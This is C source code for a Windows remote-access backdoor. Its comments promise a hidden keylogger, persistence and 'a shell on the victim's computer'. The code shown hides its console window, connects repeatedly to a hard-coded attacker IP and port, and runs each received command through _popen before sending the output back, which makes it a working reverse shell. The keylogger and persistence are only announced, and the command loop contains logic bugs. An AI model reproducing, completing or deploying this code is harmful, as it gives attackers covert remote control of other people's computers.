// connection with the server 
// hide behind an image
// execute a keylogger
// persist even after the shutting down of the computer
// provide us with a shell on the victim's computer

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h> //for connection and making sockets
#include <windows.h> //for using windows functions
#include <winuser.h> //for providing user friendly functions to the windows internals
#include <wininet.h> //deals with URLs
#include <windowsx.h>   //helps in UI with the windows system
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#define bzero(p,size) (void)(memset((p),0,(size)))

int sock;

void Shell()
{
    char buffer[1024];
    char container[1024];
    char total_response[18384];
    while(1)
    {
        jump:
        bzero(buffer,1024); //THIS WILL STORE THE COMMAND FROM US
        bzero(container,1024);  //THIS WILL STORE THE RESPONSE OF THE HACKED MACHINE
        bzero(total_response,18384);
        recv(sock,buffer,1024,0); //THIS RECEIVES AND STORES THE DATA FROM sock SOCKET INTO THE BUFFER DATASET . HERE 0 ALSO STATES THAT THERE ARE NO FURTHER ARGUMENTS THAN FIRST 3.


        if(strncmp("q",buffer,1)){ //strncmp is to compare n number of first characters of both the strings
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else{
            FILE *fp;
            fp=_popen(buffer,"r");   //THIS IS TO READ THE BUFFER AND SIMPLY EXECUTE IT ON THE MACHINE
            while(fgets(container,1024,fp)!=NULL)
            {
                strcat(total_response,container);
                //THIS SHOWS US THE ALL OF THE RESPONSE THAT WAS BROUGHT ON CONNECTING TO THE SERVER OF THE HASCKED MACHINE
                send(sock,total_response,sizeof(total_response),0);
                fclose(fp);
            }
        }
    }
}

int APIENTRY WinMain(HINSTANCE hIntsance,HINSTANCE hPrev , LPSTR lpCmdLine, int nCmdShow){   
    //To access all the required functions APIENTRY keyword is used to declare it as the entry point of the executable for the system.
    //HINSTANCE denotes the handle going on at a specified instance of the timeline.


    HWND stealth; //this is to hide the window of the application from the target
    AllocConsole(); //allocate a console to the malware activities
    stealth = FindWindowA("ConsoleWindowClass",NULL); //where to apply the stealth activityconn
    ShowWindow(stealth,0); //the ShowWindow should be 1 for the window to be visible

    struct sockaddr_in ServAddr; //info of socket address in the ServAddr struct defined in the standard library
    unsigned short ServPort; //simply an integer
    char * ServIP;
    WSADATA wsaData;
    ServIP = "192.168.145.129";
    ServPort = 50005;

    if(WSAStartup(MAKEWORD(2,0),&wsaData)!=0)   //Winstartup is ot initiate the use of winsock library and its dlls inside the program
    {
        exit(1);
    }

    sock=socket(AF_INET,SOCK_STREAM,0);

    memset(&ServAddr,0,sizeof(ServAddr));
    ServAddr.sin_family=AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); //to convert into the form of server IP address
    ServAddr.sin_port = htons(ServPort); //to convert into the form of a port of a server



    //THIS MAKES SURE THAT OUR CODE DOESNT STOP IF IT IS UNABLE TO MAKE CONNECTION TO THE VICTIMS MACHINE THROUGH SOCKETS
    start:
    while(connect(sock, (struct sockaddr *)&ServAddr , sizeof(ServAddr))!=0)

    {
        Sleep(10);
        goto start;
    }
    Shell();



}
